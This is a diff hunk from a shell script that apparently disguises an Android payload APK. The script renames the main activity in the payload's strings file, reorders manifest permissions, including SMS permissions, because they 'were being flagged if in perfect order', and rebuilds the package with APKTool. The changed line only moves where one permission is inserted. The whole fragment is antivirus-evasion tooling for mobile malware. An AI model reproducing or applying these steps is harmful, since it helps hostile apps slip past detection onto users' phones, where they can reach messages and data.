@@ -229,7 +229,7 @@ sed -i "s#MainActivity#$apkName#" /tmp/payload/res/values/strings.xml
 
 ### Re-arranging the permissions, which were being flagged if in perfect order ###
 sed -i '/.SET_WALLPAPER/d' /tmp/payload/AndroidManifest.xml
-sed -i '/READ_SMS/a<uses-permission android:name="android.permission.SET_WALLPAPER"/>' /tmp/payload/AndroidManifest.xml
+sed -i '/WRITE_SMS/a<uses-permission android:name="android.permission.SET_WALLPAPER"/>' /tmp/payload/AndroidManifest.xml
 echo -e "\033[34m [-] \x1B[0m Finished scrubbing the content. Rebuilding the package with APKTool."
 
 ### Rebuild the package using APKTool ###
